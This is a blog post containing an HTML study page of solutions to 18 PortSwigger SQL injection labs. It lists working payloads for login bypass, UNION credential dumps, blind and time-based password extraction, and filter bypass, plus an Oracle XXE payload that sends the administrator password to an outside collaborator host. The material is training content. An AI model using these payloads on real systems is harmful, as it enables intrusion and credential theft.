---
layout: post
title: "Portswigger All SQLi Labs Solutions"
date: 2026-01-02 08:00 +0530
categories: [PortSwigger Labs]
tags: [PortSwigger Labs]
---

![image](https://targetjobs.co.uk/static/7aed754252e452cf89d6f19815cef2fe/2a163/4A6B75FE-1E4A-45DE-B2E1-E5B2DDB74596.webp)

# HTML FILE :- 

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQLi Academy: Investigative Methodology</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        
        :root { --ps-orange: #ff6633; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #fdfdfd; }
        .mono { font-family: 'JetBrains Mono', monospace; word-break: break-all; }

        .phase-border { position: relative; padding-left: 2rem; }
        .phase-border::before {
            content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 2px; background: #e2e8f0;
        }

        /* Improved Code Container for long payloads */
        .payload-box {
            background: #0f172a;
            color: #38bdf8;
            padding: 1.25rem;
            border-radius: 8px;
            font-size: 0.85rem;
            line-height: 1.5;
            border-left: 4px solid var(--ps-orange);
            white-space: pre-wrap;
            position: relative;
        }

        .custom-scroll::-webkit-scrollbar { width: 5px; }
        .custom-scroll::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
        
        .nav-item.active { 
            background-color: #fff7ed; 
            color: #c2410c; 
            border-right: 4px solid var(--ps-orange);
        }
    </style>
</head>
<body class="h-screen flex flex-col overflow-hidden">

    <header class="h-14 bg-white border-b flex items-center justify-between px-6 shrink-0 z-20">
        <div class="flex items-center gap-2">
            <div class="w-6 h-6 bg-[#ff6633] rounded"></div>
            <h1 class="font-bold text-slate-800 tracking-tight text-sm uppercase tracking-widest">SQLi <span class="text-slate-400">Master Methodology</span></h1>
        </div>
        <div class="flex items-center gap-4">
             <input type="text" id="labSearch" placeholder="Filter by vulnerability..." class="w-64 bg-slate-100 border-none rounded-md px-4 py-1.5 text-xs focus:ring-1 focus:ring-orange-500">
        </div>
    </header>

    <div class="flex flex-1 overflow-hidden">
        <aside class="w-72 bg-white border-r flex flex-col shrink-0">
            <nav class="flex-1 overflow-y-auto custom-scroll p-2 space-y-0.5" id="sidebarNav"></nav>
        </aside>

        <main class="flex-1 overflow-y-auto custom-scroll bg-white" id="mainDisplay">
            <div id="welcome" class="h-full flex flex-col items-center justify-center p-12 text-center">
                <h2 class="text-2xl font-bold text-slate-800">Select Lab Methodology</h2>
                <p class="text-slate-500 max-w-sm mt-2">Comprehensive walkthroughs for all 18 PortSwigger SQLi Labs.</p>
            </div>

            <div id="labView" class="hidden p-10 max-w-4xl mx-auto">
                <div class="mb-10 border-b pb-8">
                    <div class="flex items-center gap-2 mb-2">
                        <span id="badge" class="px-2 py-0.5 bg-slate-800 text-white text-[10px] font-bold rounded uppercase"></span>
                        <span id="category" class="text-xs font-bold text-orange-600"></span>
                    </div>
                    <h2 id="title" class="text-3xl font-extrabold text-slate-900 mb-4 tracking-tight"></h2>
                    <p id="description" class="text-slate-500 text-sm leading-relaxed"></p>
                </div>

                <div id="phaseContainer" class="space-y-12"></div>
            </div>
        </main>
    </div>

    <script>
        const labs = [
            {
                id: 1, title: "WHERE clause retrieval of hidden data", category: "Basics", diff: "Apprentice",
                desc: "Filter parameter does not sanitize input, allowing modification of the WHERE clause to bypass logic.",
                phases: [
                    { title: "Logic Bypass", goal: "Display all products.", payload: "'+OR+1=1--", meaning: "Appends an 'OR True' condition.", analysis: "Standard 200 OK. Every item in the database will be rendered." }
                ]
            },
            {
                id: 2, title: "Login bypass", category: "Basics", diff: "Apprentice",
                desc: "Bypass login via commenting out the password validation.",
                phases: [
                    { title: "Admin Impersonation", goal: "Log in as administrator.", payload: "administrator'--", meaning: "Closes the username string and ignores the password check.", analysis: "Logs you into the administrator account." }
                ]
            },
            {
                id: 3, title: "Database version (Oracle)", category: "Enumeration", diff: "Practitioner",
                desc: "Oracle requires a FROM clause. Use system tables.",
                phases: [
                    { title: "Find Column Count", goal: "Match columns.", payload: "' ORDER BY 2--", meaning: "Test column count.", analysis: "200 OK confirms 2 columns." },
                    { title: "Extract Version", goal: "Display Oracle banner.", payload: "' UNION SELECT BANNER, NULL FROM v$version--", meaning: "Queries v$version system table.", analysis: "Version string appears on page." }
                ]
            },
            {
                id: 4, title: "Database version (MySQL/MS)", category: "Enumeration", diff: "Practitioner",
                desc: "Access global variables for version info.",
                phases: [
                    { title: "Extract Version", goal: "Display version.", payload: "' UNION SELECT @@version, NULL#", meaning: "Accesses @@version variable.", analysis: "Use %23 instead of # in URLs." }
                ]
            },
            {
                id: 5, title: "Listing contents (non-Oracle)", category: "Enumeration", diff: "Practitioner",
                desc: "Step-by-step mapping of database structure.",
                phases: [
                    { title: "Table Mapping", goal: "Find user table.", payload: "' UNION SELECT table_name, NULL FROM information_schema.tables--", meaning: "Lists all tables.", analysis: "Find 'users_abcdef'." },
                    { title: "Column Mapping", goal: "Find columns.", payload: "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--", meaning: "Lists columns for identified table.", analysis: "Find 'username_xyz' and 'password_xyz'." },
                    { title: "Final Dump", goal: "Extract admin credentials.", payload: "' UNION SELECT username_xyz, password_xyz FROM users_abcdef--", meaning: "Final data extraction.", analysis: "Administrator's password revealed." }
                ]
            },
            {
                id: 6, title: "Listing contents (Oracle)", category: "Enumeration", diff: "Practitioner",
                desc: "Oracle metadata tables mapping.",
                phases: [
                    { title: "Table Mapping", goal: "Find users table.", payload: "' UNION SELECT table_name, NULL FROM all_tables--", meaning: "Queries all accessible tables.", analysis: "Find 'USERS_ABCDEF'." },
                    { title: "Column Mapping", goal: "Find columns.", payload: "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--", meaning: "Queries columns for identified table.", analysis: "Find USERNAME_XYZ and PASSWORD_XYZ." },
                    { title: "Final Dump", goal: "Retrieve data.", payload: "' UNION SELECT USERNAME_XYZ, PASSWORD_XYZ FROM USERS_ABCDEF--", meaning: "Extraction query.", analysis: "Data renders in product fields." }
                ]
            },
            {
                id: 7, title: "UNION attack: Column count", category: "UNION", diff: "Practitioner",
                desc: "Determine column count using UNION NULLs.",
                phases: [
                    { title: "NULL Probing", goal: "Identify column limit.", payload: "' UNION SELECT NULL, NULL, NULL--", meaning: "Increments NULLs until 200 OK.", analysis: "Match results with ORDER BY findings." }
                ]
            },
            {
                id: 8, title: "UNION attack: Finding text column", category: "UNION", diff: "Practitioner",
                desc: "Identify which column supports strings.",
                phases: [
                    { title: "Type Validation", goal: "Find string field.", payload: "' UNION SELECT NULL, 'abc', NULL--", meaning: "Injects string literal 'abc'.", analysis: "Success if 'abc' renders on page." }
                ]
            },
            {
                id: 9, title: "UNION attack: Retrieving data", category: "UNION", diff: "Practitioner",
                desc: "Extract data using verified UNION structure.",
                phases: [
                    { title: "Data Dump", goal: "Extract credentials.", payload: "' UNION SELECT username, password FROM users--", meaning: "Standard table extraction.", analysis: "Credentials appear in list." }
                ]
            },
            {
                id: 10, title: "UNION attack: Multiple values", category: "UNION", diff: "Practitioner",
                desc: "Concatenate results into single column.",
                phases: [
                    { title: "Concatenation", goal: "Combine fields.", payload: "' UNION SELECT NULL, username||'~'||password FROM users--", meaning: "Uses '||' to join strings.", analysis: "Displays user and pass together." }
                ]
            },
            {
                id: 11, title: "Blind SQLi: Conditional responses", category: "Blind", diff: "Practitioner",
                desc: "Extract data by monitoring boolean changes in response.",
                phases: [
                    { title: "Verification", goal: "Confirm boolean logic.", payload: "TrackingId=XYZ' AND 1=1--", meaning: "Checks for 'Welcome back' message.", analysis: "False condition (1=2) should remove message." },
                    { title: "Data Extraction", goal: "Brute force password.", payload: "TrackingId=XYZ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a", meaning: "Tests character matches.", analysis: "Iterate via Burp Intruder." }
                ]
            },
            {
                id: 12, title: "Blind SQLi: Conditional errors", category: "Blind", diff: "Practitioner",
                desc: "Extract data by triggering database errors.",
                phases: [
                    { title: "Error Induction", goal: "Trigger 500 error.", payload: "'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'", meaning: "Divides by zero on True condition.", analysis: "Matches result in a 500 Internal Server Error." }
                ]
            },
            {
                id: 13, title: "Visible error-based SQLi", category: "Error", diff: "Practitioner",
                desc: "Leak information via database error messages.",
                phases: [
                    { title: "Data Leak", goal: "Force info into error.", payload: "'+AND+1=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--", meaning: "Forces type conversion error.", analysis: "Error text contains: 'Invalid input for int: [PASSWORD]'." }
                ]
            },
            {
                id: 14, title: "Blind SQLi: Time delays", category: "Blind", diff: "Practitioner",
                desc: "Trigger time delays to verify injection.",
                phases: [
                    { title: "Sleep Injection", goal: "Induce 10s delay.", payload: "'||pg_sleep(10)--", meaning: "Standard Postgres sleep.", analysis: "Response time confirms vulnerability." }
                ]
            },
            {
                id: 15, title: "Blind SQLi: Time delays & info retrieval", category: "Blind", diff: "Practitioner",
                desc: "Infer data by observing response delay.",
                phases: [
                    { title: "Time Inference", goal: "Brute force password.", payload: "'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--", meaning: "Sleeps only on character match.", analysis: "Delayed response equals character match." }
                ]
            },
            {
                id: 16, title: "Blind SQLi: Out-of-band interaction", category: "OAST", diff: "Practitioner",
                desc: "Trigger a DNS/HTTP request to Burp Collaborator using XXE in SQL.",
                phases: [
                    { title: "DNS Probe", goal: "Trigger external request.", payload: "'||EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://YOUR-ID.oastify.com/\"> %remote;]>'),'/l')||'", meaning: "Utilizes Oracle EXTRACTVALUE and XMLTYPE to trigger a DNS lookup to your collaborator domain.", analysis: "Check Burp Collaborator for incoming DNS/HTTP hits." }
                ]
            },
            {
                id: 17, title: "Blind SQLi: OOB exfiltration", category: "OAST", diff: "Practitioner",
                desc: "Steal data by appending it to the OAST request subdomain.",
                phases: [
                    { title: "Exfiltration", goal: "Steal password via DNS.", payload: "'||EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-ID.oastify.com/\"> %remote;]>'),'/l')||'", meaning: "Subqueries the password and appends it to the collaborator URL.", analysis: "Collaborator will receive a request like 'S3CRET.YOUR-ID.oastify.com'." }
                ]
            },
            {
                id: 18, title: "Filter bypass via XML encoding", category: "Bypass", diff: "Practitioner",
                desc: "Bypass WAF filters using XML hex entities.",
                phases: [
                    { title: "Encoded Payload", goal: "Bypass keyword filter.", payload: "<@hex_entities>1 UNION SELECT password FROM users WHERE username='administrator'--</@hex_entities>", meaning: "Hex encodes 'U' as &#x55; and 'S' as &#x53;.", analysis: "Application decodes the XML before passing it to the database." }
                ]
            }
        ];

        let state = { selectedId: null, search: '' };
        const els = {
            nav: document.getElementById('sidebarNav'),
            welcome: document.getElementById('welcome'),
            view: document.getElementById('labView'),
            title: document.getElementById('title'),
            desc: document.getElementById('description'),
            badge: document.getElementById('badge'),
            cat: document.getElementById('category'),
            phases: document.getElementById('phaseContainer'),
            search: document.getElementById('labSearch')
        };

        // Escaping function to ensure < and > are displayed correctly in the UI
        function escapeHtml(text) {
            const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
            return text.replace(/[&<>"']/g, m => map[m]);
        }

        function renderNav() {
            els.nav.innerHTML = labs
                .filter(l => l.title.toLowerCase().includes(state.search.toLowerCase()))
                .map(l => `
                    <button onclick="selectLab(${l.id})" class="nav-item w-full text-left p-3 rounded-md transition-all ${state.selectedId === l.id ? 'active' : 'text-slate-600 hover:bg-slate-50'}">
                        <div class="text-[9px] uppercase font-bold opacity-50 mb-0.5">${l.category}</div>
                        <div class="text-[11px] font-semibold leading-tight">${l.title}</div>
                    </button>
                `).join('');
        }

        window.selectLab = (id) => {
            state.selectedId = id;
            const lab = labs.find(l => l.id === id);
            
            els.welcome.classList.add('hidden');
            els.view.classList.remove('hidden');
            
            els.title.innerText = lab.title;
            els.desc.innerText = lab.desc;
            els.badge.innerText = lab.diff;
            els.cat.innerText = lab.category;

            els.phases.innerHTML = lab.phases.map((p, i) => `
                <div class="phase-border">
                    <div class="absolute -left-2.5 top-0 w-5 h-5 rounded-full bg-slate-800 text-white text-[10px] flex items-center justify-center font-bold z-10">${i+1}</div>
                    <div class="mb-10">
                        <div class="flex items-center gap-2 mb-4">
                            <h3 class="text-sm font-bold text-slate-800">${p.title}</h3>
                            <span class="text-[10px] text-slate-400 font-medium">| Goal: ${p.goal}</span>
                        </div>
                        
                        <div class="space-y-4">
                            <div class="payload-box mono">${escapeHtml(p.payload)}</div>
                            <div class="grid grid-cols-2 gap-8 px-1">
                                <div>
                                    <h4 class="text-[10px] uppercase font-bold text-slate-400 mb-1 tracking-tighter">Mechanism</h4>
                                    <p class="text-[11px] text-slate-600 leading-relaxed">${p.meaning}</p>
                                </div>
                                <div>
                                    <h4 class="text-[10px] uppercase font-bold text-slate-400 mb-1 tracking-tighter">Response Analysis</h4>
                                    <p class="text-[11px] text-slate-600 leading-relaxed">${p.analysis}</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `).join('');

            renderNav();
            document.getElementById('mainDisplay').scrollTop = 0;
        };

        els.search.addEventListener('input', (e) => {
            state.search = e.target.value;
            renderNav();
        });

        renderNav();
    </script>
</body>
</html>
```

* Copy and paste in any texteditor 
* save with `.html` extension
* Now open that `.html` File with your browser !

